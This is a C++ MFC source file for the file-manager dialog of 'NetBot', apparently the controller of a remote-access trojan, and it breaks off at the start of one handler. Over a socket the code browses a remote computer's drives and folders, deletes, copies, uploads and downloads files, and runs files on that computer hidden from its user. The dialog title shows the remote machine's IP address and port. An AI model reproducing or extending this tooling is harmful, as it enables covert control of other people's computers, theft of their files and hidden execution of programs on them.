// FileDlg.cpp : implementation file
//

#include "stdafx.h"
#include "NetBot.h"
#include "FileDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CFileDlg dialog

CFileDlg::CFileDlg(CWnd* pParent /*=NULL*/) : CDialog(CFileDlg::IDD, pParent)
{
    m_CurrPath = _T("");
    bCopySel = FALSE;
    m_ConnSocket = INVALID_SOCKET;
    m_ViewStyle = LVS_REPORT;
    m_Buffer.SafeCheck(2048 * 1024); //数据交换区 2MB
    m_hWorkThread = NULL;
}

CFileDlg::~CFileDlg()
{
    imgListTree.DeleteImageList();
}

void CFileDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialog::DoDataExchange(pDX);
    DDX_Control(pDX, IDC_FILELIST, m_FileList);
    DDX_Control(pDX, IDC_FILETREE, m_FileTree);
    DDX_Text(pDX, IDC_EDIT_PATH, m_CurrPath);
    DDV_MaxChars(pDX, m_CurrPath, 200);
}


BEGIN_MESSAGE_MAP(CFileDlg, CDialog)
    ON_NOTIFY(NM_DBLCLK, IDC_FILELIST, OnDblclkFilelist)
    ON_NOTIFY(NM_CLICK, IDC_FILELIST, OnClickFilelist)
    ON_NOTIFY(NM_RCLICK, IDC_FILELIST, OnRclickFilelist)
    ON_COMMAND(ID_FILE_RUNNORMAL, OnFileRunnormal)
    ON_COMMAND(ID_FILE_RUNHIDE, OnFileRunhide)
    ON_COMMAND(ID_FILE_COPY, OnFileCopy)
    ON_COMMAND(ID_FILE_PASTE, OnFilePaste)
    ON_COMMAND(ID_FILE_DELETE, OnFileDelete)
    ON_COMMAND(ID_FILE_UPLOAD, OnFileUpload)
    ON_COMMAND(ID_FILE_DOWNLOAD, OnFileDownload)
    ON_COMMAND(ID_FILE_REFURSH, OnFileRefursh)
    ON_NOTIFY(TVN_SELCHANGED, IDC_FILETREE, OnSelchangedFiletree)
    ON_BN_CLICKED(IDC_BTN_ADDRGO, OnBtnAddrGo)
    ON_NOTIFY(LVN_COLUMNCLICK, IDC_FILELIST, OnColumnclickFilelist)
    ON_COMMAND(ID_FILE_BACKUP, OnFileBackup)
    ON_COMMAND(ID_FILE_CHGVIEW, OnFileViewChg)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CFileDlg message handlers
void CFileDlg::SetConnSocket(SOCKET socket)
{
    m_ConnSocket = socket;

    sockaddr_in addr;
    int cb = sizeof(addr);
    int ir = getpeername(m_ConnSocket, (sockaddr*)&addr, &cb);
    CString OnlineIP;
    OnlineIP.Format("%s:%d", inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));//ntohs函数将u_long转int

    SetWindowText("[文件管理] " + OnlineIP);

    GetRootDrivers();
}

void CFileDlg::StatusTextOut(int iPane, LPCTSTR ptzFormat, ...)
{
    TCHAR tzText[1024];

    va_list vlArgs;
    va_start(vlArgs, ptzFormat);
    wvsprintf(tzText, ptzFormat, vlArgs);
    va_end(vlArgs);

    m_wndStatusBar.SetText(tzText, iPane, 0);
}

BOOL CFileDlg::OnInitDialog()
{
    CDialog::OnInitDialog();

    // Set the small icon for this dialog
    SetIcon(AfxGetApp()->LoadIcon(IDI_OL_FILE), FALSE);
    CenterWindow();

    // TODO: Add extra initialization here
    //Add toolbar===============================
    if (!m_wndToolBar.CreateEx(this, TBSTYLE_FLAT |
                               TBSTYLE_LIST,
                               WS_CHILD |
                               WS_VISIBLE |
                               CBRS_ALIGN_TOP |
                               CBRS_GRIPPER |
                               CBRS_TOOLTIPS,
                               CRect(2, 2, 0, 0)) ||
        !m_wndToolBar.LoadToolBar(IDR_FILE_TOOLBAR)) {
        TRACE0("failed to create toolbar\n");
        return FALSE;
    }
    //Add bitmap to toolbar
    m_wndToolBar.LoadTrueColorToolBar(16, IDB_FILETB_NORMAL, IDB_FILETB_HOT,
                                      IDB_FILETB_DISABLE);
    RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);
    VERIFY(m_wndToolBar.SetButtonText(0, "向上"));
    VERIFY(m_wndToolBar.SetButtonText(1, "复制"));
    VERIFY(m_wndToolBar.SetButtonText(2, "粘贴"));
    VERIFY(m_wndToolBar.SetButtonText(3, "删除"));
    VERIFY(m_wndToolBar.SetButtonText(4, "上传"));
    VERIFY(m_wndToolBar.SetButtonText(5, "下载"));
    VERIFY(m_wndToolBar.SetButtonText(6, "刷新"));
    VERIFY(m_wndToolBar.SetButtonText(7, "查看"));
    //m_wndToolBar.AddDropDownButton(this, ID_FILE_CHGVIEW, IDR_MENU_FILEVIEW);

    //create statusbar=============================
    m_wndStatusBar.Create(WS_CHILD | WS_VISIBLE | CCS_BOTTOM,
                          CRect(0, 0, 0, 0), this, 0x1100001);
    int strPartDim[2] = {
        400, -1
    };
    m_wndStatusBar.SetParts(2, strPartDim);

    //加载菜单====================================
    m_FileMenu.LoadMenu(IDR_MENU_FILERIGHT);

    // Initialize driver image lists
    imgListTree.Create(18, 18, ILC_COLOR24 | ILC_MASK, 0, 7);
    HBITMAP hBitmap = (HBITMAP)LoadImage(AfxGetResourceHandle(),
                                         MAKEINTRESOURCE(IDB_FOLDERS),
                                         IMAGE_BITMAP, 0, 0,
                                         LR_DEFAULTSIZE | LR_CREATEDIBSECTION);
    imgListTree.Add(CBitmap::FromHandle(hBitmap), RGB(255, 255, 255));
    ::DeleteObject(hBitmap);
    m_FileTree.SetImageList(&imgListTree, TVSIL_NORMAL);
    m_FileTree.InsertItem("远程电脑", 2, 2, 0, 0);

    //===========================================

    //	ListView_SetExtendedListViewStyle(m_FileList.m_hWnd,LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT);
    m_FileList.InsertColumn(0, "文件名", LVCFMT_LEFT, 200);
    m_FileList.InsertColumn(1, "类型", LVCFMT_LEFT, 100);
    m_FileList.InsertColumn(2, "大小", LVCFMT_LEFT, 90);
    m_FileList.InsertColumn(3, "修改时间", LVCFMT_LEFT, 250);
    //给列表控件设置图象列表
    m_FileList.SetImageList(&((CNetBotApp *)AfxGetApp())->m_SmallImgList,
                            LVSIL_SMALL);
    m_FileList.SetImageList(&((CNetBotApp *)AfxGetApp())->m_LargeImgList,
                            LVSIL_NORMAL);

    return TRUE;
}

void CFileDlg::PostNcDestroy()
{
    // TODO: Add your specialized code here and/or call the base class
    CDialog::PostNcDestroy();
    //delete掉主对话框中new出来的指针
    delete this;
}

void CFileDlg::OnCancel()
{
    StopWork();

    DeleteAllItems();

    //非模式对话框，需要这样销毁对话框
    DestroyWindow();
    //CDialog::OnCancel();
}

BOOL CFileDlg::PreTranslateMessage(MSG* pMsg)
{
    // TODO: Add your specialized code here and/or call the base class
    if (pMsg->message == WM_KEYDOWN) {
        int nVirtKey = (int)pMsg->wParam;
        if (nVirtKey == VK_RETURN) {
            //如果是回车在这里做你要做的事情,或者什么也不作
            return TRUE;
        }
        if (nVirtKey == VK_ESCAPE) {
            //如果是ESC在这里做你要做的事情,或者什么也不作
            //中断文件枚举线程
            DWORD dwExitCode;
            if (m_hWorkThread != NULL) {
                WaitForSingleObject(m_hWorkThread, 100);
                if (GetExitCodeThread(m_hWorkThread, &dwExitCode)) {
                    if (dwExitCode == STILL_ACTIVE)
                        TerminateThread(m_hWorkThread, dwExitCode);
                }

                OnWorkEnd();
            }

            return TRUE;
        }
    }

    return CDialog::PreTranslateMessage(pMsg);
}

int CFileDlg::GetIconIndex(LPCTSTR lpszPath, BOOL bIsDir, BOOL bSelected)
{
    SHFILEINFO sfi;
    memset(&sfi, 0, sizeof(sfi));

    if (bIsDir) {
        SHGetFileInfo(lpszPath, FILE_ATTRIBUTE_DIRECTORY, &sfi, sizeof(sfi),
                      SHGFI_SMALLICON |
                      SHGFI_SYSICONINDEX |
                      SHGFI_USEFILEATTRIBUTES |
                      (bSelected ? SHGFI_OPENICON : 0));
        return  sfi.iIcon;
    }

    SHGetFileInfo(lpszPath, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(sfi),
                  SHGFI_SMALLICON |
                  SHGFI_SYSICONINDEX |
                  SHGFI_USEFILEATTRIBUTES |
                  (bSelected ? SHGFI_OPENICON : 0));

    return sfi.iIcon;
}


void CFileDlg::OnWorkBegin()
{
    m_FileList.EnableWindow(FALSE);
    m_FileTree.EnableWindow(FALSE);
}

void CFileDlg::OnWorkEnd()
{
    m_FileList.EnableWindow(TRUE);
    m_FileTree.EnableWindow(TRUE);

    CloseHandle(m_hWorkThread);
    m_hWorkThread = NULL;
}

DWORD CFileDlg::ListDriver()
{
    OnWorkBegin();

    //发送获取盘符命令
    m_MsgHead.dwCmd = CMD_FILEDRIVER;
    m_MsgHead.dwSize = 0;

    //数据传输同时接收数据
    if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket, m_Buffer, &m_MsgHead)) {
        //数据传输失败
        StatusTextOut(0, "通信失败");
        OnWorkEnd();
        return 0;
    }
    if (m_MsgHead.dwCmd != 0) {
        //数据传输失败
        StatusTextOut(0, "获取远程电脑磁盘失败");
        OnWorkEnd();
        return 0;
    }

    //显示远程磁盘
    m_FileList.DeleteAllItems();

    DWORD dwNum = m_MsgHead.dwSize / sizeof(DriverInfo);
    BYTE* m_DesBuf = (LPBYTE)m_Buffer.c_str();
    LPDriverInfo pInfo = (LPDriverInfo)m_DesBuf;
    int iImage = 0, iSelectedImage = 0;
    HTREEITEM hTreeRoot = m_FileTree.GetRootItem();

    for (DWORD i = 0; i < dwNum; i++) {
        //添加盘符
        switch (pInfo[i].drivertype) {
        case DRIVE_REMOVABLE:
            // 可移动驱动器
        {
            iImage = 4;
            iSelectedImage = 4;
        }
        break;
        case DRIVE_REMOTE:
            // 网络驱动器
        {
            iImage = 6;
            iSelectedImage = 6;
        }
        break;
        case DRIVE_CDROM:
            // CD-ROM
        {
            iImage = 5;
            iSelectedImage = 5;
        }
        break;
        case DRIVE_FIXED:
            // 固定的驱动器
        {
            iImage = 3;
            iSelectedImage = 3;
        }
        break;
        default:
            //不认识的类型跳过，不显示
        {
            pInfo[i].display[1] = 0;
        }
        break;
        }

        //Win2000会接收到一些错误的盘符
        if (strlen(pInfo[i].display) < 2)
            continue;

        //插入数据
        HTREEITEM hItem = m_FileTree.InsertItem(pInfo[i].display, iImage,
                                                iSelectedImage, hTreeRoot, 0);
        m_FileTree.SetItemData(hItem, (DWORD)pInfo[i].driver[0]);
    }

    m_FileTree.Expand(hTreeRoot, TVE_EXPAND);

    StatusTextOut(0, "获取远程磁盘成功");
    OnWorkEnd();
    return 0;
}

DWORD CFileDlg::ListDirectory()
{
    OnWorkBegin();

    //发送获取盘符命令
    m_MsgHead.dwCmd = CMD_FILEDIRECTORY;
    m_MsgHead.dwSize = m_SendPath.GetLength();
    lstrcpy(m_Buffer, m_SendPath);

    //数据传输同时接收数据
    if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket, m_Buffer, &m_MsgHead)) {
        //数据传输失败
        StatusTextOut(0, "通信失败");
        OnWorkEnd();
        return 0;
    }
    if (m_MsgHead.dwCmd != 0) {
        //数据传输失败
        if (m_MsgHead.dwCmd == CMD_DIRFLODERERR)
            StatusTextOut(0, "目录不能访问");
        else
            StatusTextOut(0, "获取远程目录失败");
        OnWorkEnd();
        return 0;
    }

    //显示文件列表
    DeleteAllItems();

    DWORD dwNum = m_MsgHead.dwSize / sizeof(FileInfo);
    BYTE* m_DesBuf = (LPBYTE)m_Buffer.c_str();
    LPFileInfo pInfo = (LPFileInfo)m_DesBuf;

    for (DWORD i = 0; i < dwNum; i++) {
        //显示时候，文件夹在上面，文件在下面
        int iIcon = 0, iInsertItem = 0;
        if (pInfo[i].iType == 2) { //文件
            iIcon = GetIconIndex(pInfo[i].cFileName, FALSE);
            iInsertItem = m_FileList.GetItemCount();
        }
        if (pInfo[i].iType == 1) { //文件夹
            iIcon = GetIconIndex(pInfo[i].cFileName, TRUE);
            lstrcpy(pInfo[i].cAttrib, "文件夹");
            iInsertItem = 0;
        }

        m_FileList.InsertItem(iInsertItem, "", iIcon);
        m_FileList.SetItemData(iInsertItem, (DWORD_PTR)new FileInfo(pInfo[i]));
        m_FileList.SetItemText(iInsertItem, 0, pInfo[i].cFileName);
        m_FileList.SetItemText(iInsertItem, 1, pInfo[i].cAttrib);
        m_FileList.SetItemText(iInsertItem, 2, pInfo[i].cSize);
        m_FileList.SetItemText(iInsertItem, 3, pInfo[i].cTime);
    }

    StatusTextOut(0, "获取远程文件列表成功");
    StatusTextOut(1, "共有文件、文件夹%d个", dwNum);
    OnWorkEnd();
    return 0;
}

DWORD CFileDlg::FileDelete()
{
    OnWorkBegin();

    int nItem = m_FileList.GetNextItem(-1, LVNI_SELECTED);

    FileOpt m_FileOpt;
    memset(&m_FileOpt, 0, sizeof(FileOpt));
    strncpy(m_FileOpt.cScrFile, m_SendPath, 99);

    //发送获取盘符命令
    m_MsgHead.dwCmd = CMD_FILEDELETE;
    m_MsgHead.dwSize = sizeof(FileOpt);
    memcpy(m_Buffer, &m_FileOpt, sizeof(FileOpt));

    //数据传输同时接收数据
    if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket,
            m_Buffer,
            &m_MsgHead)) {
        //数据传输失败
        StatusTextOut(0, "通信失败");
        OnWorkEnd();
        return 0;
    }
    if (m_MsgHead.dwCmd != CMD_SUCCEED) {
        //数据传输失败
        StatusTextOut(0, "删除文件失败");
        OnWorkEnd();
        return 0;
    }

    //删除该文件
    m_FileList.DeleteItem(nItem);

    StatusTextOut(0, "删除文件成功");
    OnWorkEnd();
    return 0;
}

DWORD CFileDlg::FileExecNormal()
{
    OnWorkBegin();

    FileOpt m_FileOpt;
    memset(&m_FileOpt, 0, sizeof(FileOpt));
    m_FileOpt.iSize = 1;//正常运行
    strncpy(m_FileOpt.cScrFile, m_SendPath, 99);

    //发送[正常运行]命令
    m_MsgHead.dwCmd = CMD_FILEEXEC;
    m_MsgHead.dwSize = sizeof(FileOpt);
    memcpy(m_Buffer, &m_FileOpt, sizeof(FileOpt));

    //数据传输同时接收数据
    if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket,
            m_Buffer,
            &m_MsgHead)) {
        //数据传输失败
        StatusTextOut(0, "通信失败");
        OnWorkEnd();
        return 0;
    }
    if (m_MsgHead.dwCmd != CMD_SUCCEED) {
        //数据传输失败
        StatusTextOut(0, "打开文件失败");
        OnWorkEnd();
        return 0;
    }

    StatusTextOut(0, "打开文件成功");
    OnWorkEnd();
    return 0;
}

DWORD CFileDlg::FileExecHide()
{
    OnWorkBegin();

    FileOpt m_FileOpt;
    memset(&m_FileOpt, 0, sizeof(FileOpt));
    m_FileOpt.iSize = -1;//隐藏运行
    strncpy(m_FileOpt.cScrFile, m_SendPath, 99);

    //发送[隐藏运行]命令
    m_MsgHead.dwCmd = CMD_FILEEXEC;
    m_MsgHead.dwSize = sizeof(FileOpt);
    memcpy(m_Buffer, &m_FileOpt, sizeof(FileOpt));

    //数据传输同时接收数据
    if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket,
            m_Buffer,
            &m_MsgHead)) {
        //数据传输失败
        StatusTextOut(0, "通信失败");
        OnWorkEnd();
        return 0;
    }
    if (m_MsgHead.dwCmd != CMD_SUCCEED) {
        //数据传输失败
        StatusTextOut(0, "隐藏打开文件失败");
        OnWorkEnd();
        return 0;
    }

    StatusTextOut(0, "隐藏打开文件成功");
    OnWorkEnd();
    return 0;
}

DWORD CFileDlg::FilePaste()
{
    OnWorkBegin();

    CString temp;
    temp = m_CurrPath + "\\" + m_CopyPath.Right(m_CopyPath.GetLength() -
           m_CopyPath.ReverseFind('\\') -
           1);
    if (temp == m_CopyPath) {
        temp = m_CurrPath +
               "\\复制" +
               m_CopyPath.Right(m_CopyPath.GetLength() -
                                m_CopyPath.ReverseFind('\\') -
                                1);
    }

    FileOpt m_FileOpt;
    memset(&m_FileOpt, 0, sizeof(FileOpt));
    strncpy(m_FileOpt.cScrFile, m_CopyPath, 99);
    strncpy(m_FileOpt.cDstFile, temp, 99);

    //发送[粘贴]命令
    m_MsgHead.dwCmd = CMD_FILEPASTE;
    m_MsgHead.dwSize = sizeof(FileOpt);
    memcpy(m_Buffer, &m_FileOpt, sizeof(FileOpt));

    //数据传输同时接收数据
    if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket,
            m_Buffer,
            &m_MsgHead)) {
        //数据传输失败
        StatusTextOut(0, "通信失败");
        OnWorkEnd();
        return 0;
    }
    if (m_MsgHead.dwCmd != CMD_SUCCEED) {
        //数据传输失败
        StatusTextOut(0, "复制粘贴文件失败");
        OnWorkEnd();
        return 0;
    }

    StatusTextOut(0, "复制粘贴文件成功");
    OnWorkEnd();
    return 0;
}

DWORD CFileDlg::FileUpLoad()
{
    OnWorkBegin();

    //获取上传文件路径
    CString FileSavePath, FileOpenName;
    TCHAR FileOpenPath[MAX_PATH];

    OPENFILENAME ofn;
    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = m_hWnd;
    ofn.lpstrFile = FileOpenPath;
    ofn.lpstrFile[0] = _T('\0');
    ofn.nMaxFile = sizeof(FileOpenPath);
    ofn.lpstrFilter = _T("上传文件(*.*)\0*.*\0\0");
    ofn.nFilterIndex = 1;
    ofn.lpstrFileTitle = NULL;
    ofn.nMaxFileTitle = 0;
    ofn.lpstrInitialDir = NULL;
    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
    if (!GetOpenFileName(&ofn)) {
        OnWorkEnd();
        return 0;
    }

    ///////////////////////////////////////////////////
    FileOpenName = ExtractNameFromFullPath(FileOpenPath);
    FileSavePath = m_CurrPath + "\\" + FileOpenName;

    FileOpt m_FileOpt;
    memset(&m_FileOpt, 0, sizeof(FileOpt));
    strncpy(m_FileOpt.cScrFile, FileSavePath, 99);
    strncpy(m_FileOpt.cDstFile, FileOpenPath, 99);

    //发送[上传文件]命令
    m_MsgHead.dwCmd = CMD_FILEUPSTART;
    m_MsgHead.dwSize = sizeof(FileOpt);
    memcpy(m_Buffer, &m_FileOpt, sizeof(FileOpt));

    //数据传输同时接收数据
    if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket,
            m_Buffer,
            &m_MsgHead)) {
        //数据传输失败
        StatusTextOut(0, "通信失败");
        OnWorkEnd();
        return 0;
    }
    if (m_MsgHead.dwCmd != CMD_SUCCEED) {
        //数据传输失败
        StatusTextOut(0, "上传文件失败");
        OnWorkEnd();
        return 0;
    }

    StatusTextOut(0, "");
    OnWorkEnd();
    return 0;
}

DWORD CFileDlg::FileDownLoad()
{
    OnWorkBegin();

    //获取文件下载保存路径
    TCHAR szSaveFile[MAX_PATH];
    lstrcpy(szSaveFile, ExtractNameFromFullPath(m_SendPath));//填充默认文件名
    AfxMessageBox(szSaveFile);
    OPENFILENAME ofn;
    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = GetSafeHwnd();
    ofn.lpstrFile = szSaveFile;
    ofn.nMaxFile = sizeof(szSaveFile);
    ofn.lpstrFilter = _T("下载文件(*.*)\0*.*\0\0");
    ofn.nFilterIndex = 1;
    ofn.lpstrFileTitle = NULL;
    ofn.nMaxFileTitle = 0;
    ofn.lpstrInitialDir = NULL;
    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
    if (!GetSaveFileName(&ofn)) {
        OnWorkEnd();
        return 0;
    }

    ///////////////////////////////////////////////////

    FileOpt m_FileOpt;
    memset(&m_FileOpt, 0, sizeof(FileOpt));
    strncpy(m_FileOpt.cScrFile, m_SendPath, 99);
    strncpy(m_FileOpt.cDstFile, szSaveFile, 99);

    //发送[下载文件]命令
    m_MsgHead.dwCmd = CMD_FILEDOWNSTART;
    m_MsgHead.dwSize = sizeof(FileOpt);
    memcpy(m_Buffer, &m_FileOpt, sizeof(FileOpt));

    //数据传输同时接收数据
    if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket,
            m_Buffer,
            &m_MsgHead)) {
        //数据传输失败
        StatusTextOut(0, "通信失败");
        OnWorkEnd();
        return 0;
    }
    if (m_MsgHead.dwCmd != CMD_SUCCEED) {
        //数据传输失败
        StatusTextOut(0, "下载文件失败");
        OnWorkEnd();
        return 0;
    }

    StatusTextOut(0, "");
    OnWorkEnd();
    return 0;
}

CString CFileDlg::ExtractNameFromFullPath(CString szFullPath)
{
    char path_buffer[_MAX_PATH];
    char fname[_MAX_FNAME];
    char ext[_MAX_EXT];
    lstrcpy(path_buffer, szFullPath);
    _splitpath(path_buffer, NULL, NULL, fname, ext);

    return CString(fname) + CString(ext);
}

void CFileDlg::GetRootDrivers()
{
    // TODO: Add your control notification handler code here
    //获取远程盘符
    m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::ListDriver);

    if (m_hWorkThread == NULL)
        StatusTextOut(0, "获取远程电脑磁盘失败");
}

void CFileDlg::StopWork()
{
    //关闭socket
    shutdown(m_ConnSocket, 0x02);
    closesocket(m_ConnSocket);

    //结束接收线程
    DWORD dwExitCode;
    if (m_hWorkThread != NULL) {
        WaitForSingleObject(m_hWorkThread, 100);
        if (GetExitCodeThread(m_hWorkThread, &dwExitCode)) {
            if (dwExitCode == STILL_ACTIVE)
                TerminateThread(m_hWorkThread, dwExitCode);
        }
        m_hWorkThread = NULL;
    }
}

void CFileDlg::OnSelchangedFiletree(NMHDR* pNMHDR, LRESULT* pResult)
{
    NM_TREEVIEW* pNMTreeView = (NM_TREEVIEW*)pNMHDR;
    // TODO: Add your control notification handler code here
    HTREEITEM hSelItem = m_FileTree.GetSelectedItem();  	 //获取当前选中结点
    //HTREEITEM hSelItem = pNMTreeView->itemNew.hItem;//保存用户打开的子树节点句柄
    if (hSelItem == NULL)
        return;
    if (hSelItem == m_FileTree.GetRootItem())
        return;

    DWORD ch = m_FileTree.GetItemData(hSelItem);
    if (ch == 'A' || ch == 'B')//A,B盘不处理
        return;

    //设置当前目录
    m_CurrPath.Format("%c:", (char)ch);
    UpdateData(FALSE);
    //拼接列举路径
    m_SendPath = m_CurrPath + "\\*";
    //列举目录

    m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::ListDirectory);

    if (m_hWorkThread == NULL)
        StatusTextOut(0, "获取远程目录列表失败");

    *pResult = 0;
}

void CFileDlg::OnFileBackup()
{
    // TODO: Add your command handler code here
    //获取上一层目录路径
    if (m_CurrPath.GetLength() < 3)//根目录
        return;
    m_SendPath = m_CurrPath;
    int pos = m_SendPath.ReverseFind('\\');
    m_CurrPath = m_SendPath.Left(pos);
    UpdateData(FALSE);
    //拼接列举路径
    m_SendPath = m_CurrPath + "\\*";
    //列举目录
    m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::ListDirectory);

    if (m_hWorkThread == NULL)
        StatusTextOut(0, "获取远程目录列表失败");
}

void CFileDlg::OnFileViewChg()
{
    // TODO: Add your command handler code here
    switch (m_ViewStyle) {
    case LVS_ICON: {
        m_FileList.ModifyStyle(m_ViewStyle, LVS_REPORT);
        m_ViewStyle = LVS_REPORT;
    }
    break;
    case LVS_REPORT: {
        m_FileList.ModifyStyle(m_ViewStyle, LVS_SMALLICON);
        m_ViewStyle = LVS_SMALLICON;
    }
    break;
    case LVS_SMALLICON: {
        m_FileList.ModifyStyle(m_ViewStyle, LVS_LIST);
        m_ViewStyle = LVS_LIST;
    }
    break;
    case LVS_LIST: {
        m_FileList.ModifyStyle(m_ViewStyle, LVS_ICON);
        m_ViewStyle = LVS_ICON;
    }
    break;
    default:
        break;
    }
}


void CFileDlg::OnDblclkFilelist(NMHDR* pNMHDR, LRESULT* pResult)
{
    // TODO: Add your control notification handler code here
    m_FileTree.SelectItem(NULL);
    //双击文件夹打开
    POSITION pos = m_FileList.GetFirstSelectedItemPosition();
    int iCurrSel = m_FileList.GetNextSelectedItem(pos);
    if (iCurrSel < 0)
        return;//未选中含内容项

    LPFileInfo file = (LPFileInfo)m_FileList.GetItemData(iCurrSel);
    if (1 == file->iType) { //文件夹
        CString m_SelItem = m_FileList.GetItemText(iCurrSel, 0);
        m_CurrPath += "\\";
        m_CurrPath += m_SelItem;
        UpdateData(FALSE);

        //拼接列举路径
        m_SendPath = m_CurrPath + "\\*";
        //列举目录
        m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::ListDirectory);

        if (m_hWorkThread == NULL)
            StatusTextOut(0, "获取远程目录列表失败");
    }

    *pResult = 0;
}

//左键单击，选定文件
void CFileDlg::OnClickFilelist(NMHDR* pNMHDR, LRESULT* pResult)
{
    // TODO: Add your control notification handler code here
    m_FileTree.SelectItem(NULL);
    //单击组装文件路径
    POSITION pos = m_FileList.GetFirstSelectedItemPosition();
    int iCurrSel = m_FileList.GetNextSelectedItem(pos);
    if (iCurrSel >= 0) {
        CString m_SelFile = m_FileList.GetItemText(iCurrSel, 0);
        m_SendPath = m_CurrPath + "\\" + m_SelFile;
    } else { //iCurrSel < 0,未选中含内容项
        m_SendPath = m_CurrPath;
    }
    StatusTextOut(0, m_SendPath);

    //菜单，工具条的使能处理
    CMenu* pSubMenu = m_FileMenu.GetSubMenu(0);
    CToolBarCtrl* pToolBar = (CToolBarCtrl*)&m_wndToolBar.GetToolBarCtrl();

    if (iCurrSel < 0) { //未选中含内容项
        pSubMenu->EnableMenuItem(ID_FILE_RUNNORMAL, MF_GRAYED);
        pSubMenu->EnableMenuItem(ID_FILE_RUNHIDE, MF_GRAYED);
        pSubMenu->EnableMenuItem(ID_FILE_COPY, MF_GRAYED);
        pSubMenu->EnableMenuItem(ID_FILE_PASTE, MF_ENABLED);
        pSubMenu->EnableMenuItem(ID_FILE_DELETE, MF_GRAYED);
        pSubMenu->EnableMenuItem(ID_FILE_UPLOAD, MF_ENABLED);
        pSubMenu->EnableMenuItem(ID_FILE_DOWNLOAD, MF_GRAYED);
        pSubMenu->EnableMenuItem(ID_FILE_REFURSH, MF_ENABLED);

        pToolBar->EnableButton(ID_FILE_COPY, FALSE);
        pToolBar->EnableButton(ID_FILE_PASTE, TRUE);
        pToolBar->EnableButton(ID_FILE_DELETE, FALSE);
        pToolBar->EnableButton(ID_FILE_UPLOAD, TRUE);
        pToolBar->EnableButton(ID_FILE_DOWNLOAD, FALSE);
        pToolBar->EnableButton(ID_FILE_REFURSH, TRUE);
    }
    if (iCurrSel >= 0) {
        LPFileInfo file = (LPFileInfo)m_FileList.GetItemData(iCurrSel);
        if (2 == file->iType) { //文件
            pSubMenu->EnableMenuItem(ID_FILE_RUNNORMAL, MF_ENABLED);
            pSubMenu->EnableMenuItem(ID_FILE_RUNHIDE, MF_ENABLED);
            pSubMenu->EnableMenuItem(ID_FILE_COPY, MF_ENABLED);
            pSubMenu->EnableMenuItem(ID_FILE_PASTE, MF_ENABLED);
            pSubMenu->EnableMenuItem(ID_FILE_DELETE, MF_ENABLED);
            pSubMenu->EnableMenuItem(ID_FILE_UPLOAD, MF_ENABLED);
            pSubMenu->EnableMenuItem(ID_FILE_DOWNLOAD, MF_ENABLED);
            pSubMenu->EnableMenuItem(ID_FILE_REFURSH, MF_ENABLED);

            pToolBar->EnableButton(ID_FILE_COPY, TRUE);
            pToolBar->EnableButton(ID_FILE_PASTE, TRUE);
            pToolBar->EnableButton(ID_FILE_DELETE, TRUE);
            pToolBar->EnableButton(ID_FILE_UPLOAD, TRUE);
            pToolBar->EnableButton(ID_FILE_DOWNLOAD, TRUE);
            pToolBar->EnableButton(ID_FILE_REFURSH, TRUE);
        } else {
            pSubMenu->EnableMenuItem(ID_FILE_RUNNORMAL, MF_ENABLED);
            pSubMenu->EnableMenuItem(ID_FILE_RUNHIDE, MF_ENABLED);
            pSubMenu->EnableMenuItem(ID_FILE_COPY, MF_GRAYED);
            pSubMenu->EnableMenuItem(ID_FILE_PASTE, MF_ENABLED);
            pSubMenu->EnableMenuItem(ID_FILE_DELETE, MF_GRAYED);
            pSubMenu->EnableMenuItem(ID_FILE_UPLOAD, MF_ENABLED);
            pSubMenu->EnableMenuItem(ID_FILE_DOWNLOAD, MF_GRAYED);
            pSubMenu->EnableMenuItem(ID_FILE_REFURSH, MF_ENABLED);

            pToolBar->EnableButton(ID_FILE_COPY, FALSE);
            pToolBar->EnableButton(ID_FILE_PASTE, TRUE);
            pToolBar->EnableButton(ID_FILE_DELETE, FALSE);
            pToolBar->EnableButton(ID_FILE_UPLOAD, TRUE);
            pToolBar->EnableButton(ID_FILE_DOWNLOAD, FALSE);
            pToolBar->EnableButton(ID_FILE_REFURSH, TRUE);
        }
    }
    if (!bCopySel) {
        pSubMenu->EnableMenuItem(ID_FILE_PASTE, MF_GRAYED);

        pToolBar->EnableButton(ID_FILE_PASTE, FALSE);
    }

    *pResult = 0;
}

//右键单击，显示菜单
void CFileDlg::OnRclickFilelist(NMHDR* pNMHDR, LRESULT* pResult)
{
    // TODO: Add your control notification handler code here
    //先按左键处理，再显示菜单
    OnClickFilelist(pNMHDR, pResult);

    //显示右键菜单
    CMenu* pSubMenu;
    pSubMenu = m_FileMenu.GetSubMenu(0);
    CPoint oPoint;
    GetCursorPos(&oPoint);
    pSubMenu->TrackPopupMenu(TPM_LEFTALIGN, oPoint.x, oPoint.y, this);

    *pResult = 0;
}

void CFileDlg::OnFileRunnormal()
{
